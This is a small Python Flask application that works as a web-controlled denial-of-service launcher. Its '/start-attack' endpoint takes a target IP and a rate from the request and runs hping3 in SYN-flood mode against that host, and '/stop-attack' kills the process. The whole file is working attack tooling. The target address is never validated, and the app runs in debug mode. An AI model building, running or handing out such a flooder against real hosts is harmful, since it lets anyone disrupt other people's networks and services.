from flask import Flask, request, jsonify, render_template
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start-attack', methods=['POST'])
def start_attack():
    traffic = request.json.get('traffic', 0)
    target_ip = request.json.get('target_ip', '127.0.0.1')
    subprocess.Popen(['hping3', '-i', f'u{traffic}', '-S', '--flood', target_ip])
    return jsonify({"status": "Attack started"}), 200

@app.route('/stop-attack', methods=['POST'])
def stop_attack():
    subprocess.Popen(['pkill', 'hping3'])
    return jsonify({"status": "Attack stopped"}), 200

if __name__ == '__main__':
    app.run(debug=True)
